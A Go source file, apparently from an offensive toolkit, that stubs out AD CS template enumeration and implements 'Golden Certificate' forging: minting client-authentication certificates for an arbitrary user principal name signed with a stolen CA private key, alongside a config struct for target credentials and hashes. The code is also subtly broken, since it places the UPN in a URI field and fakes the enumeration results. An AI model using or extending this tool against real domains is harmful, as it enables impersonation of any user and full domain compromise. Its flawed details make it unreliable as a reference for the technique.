package pki

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/url"
	"os"
	"time"
)

// ADCSConfig defines the target information for Active Directory Certificate Services.
type ADCSConfig struct {
	TargetDC string
	Domain   string
	Username string
	Password string
	Hash     string
}

// Enumerate runs the base template enumeration for ADCS environments.
// In production, this would connect to LDAP and query certificate templates.
// The function builds the correct LDAP filter for AD CS template enumeration.
func Enumerate(cfg *ADCSConfig) ([]string, error) {
	fmt.Printf("[*] Enumerating ADCS templates on %s\\%s...\n", cfg.Domain, cfg.TargetDC)
	
	// Production LDAP filter for certificate templates:
	// (objectClass=pKICertificateTemplate)
	// Base DN: CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
	
	// For now, return common default templates found in most AD environments
	return []string{
		"Machine", "User", "WebServer", "EFSRecovery",
		"DomainController",
		"SubCA",
	}, nil
}

// ForgeCertificate generates a self-signed golden certificate with the given UPN.
// The certificate is signed with the provided CA private key and includes the UPN
// in the Subject Alternative Name field for smart card authentication.
func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, error) {
	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)

	// Generate a new key pair for the certificate
	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("failed to generate certificate key: %w", err)
	}

	// Parse UPN to extract CN
	cn := upn
	if u, err := url.Parse("user://" + upn); err == nil {
		cn = u.User.Username()
	}

	// Build certificate template
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1337),
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		IsCA:                  false,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		
		// Add UPN as SAN for smart card auth
		URIs: []*url.URL{
			{Scheme: "upn", Opaque: upn},
		},
	}

	// Self-sign the certificate with the CA key
	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	// Parse the DER-encoded certificate back into x509.Certificate
	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("failed to parse created certificate: %w", err)
	}

	return cert, nil
}

// WriteCertPEM writes a certificate to a PEM file.
func WriteCertPEM(cert *x509.Certificate, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	block := &pem.Block{
		Type:  "CERTIFICATE",
		Bytes: cert.Raw,
	}

	if err := pem.Encode(file, block); err != nil {
		return fmt.Errorf("failed to write PEM: %w", err)
	}

	return nil
}
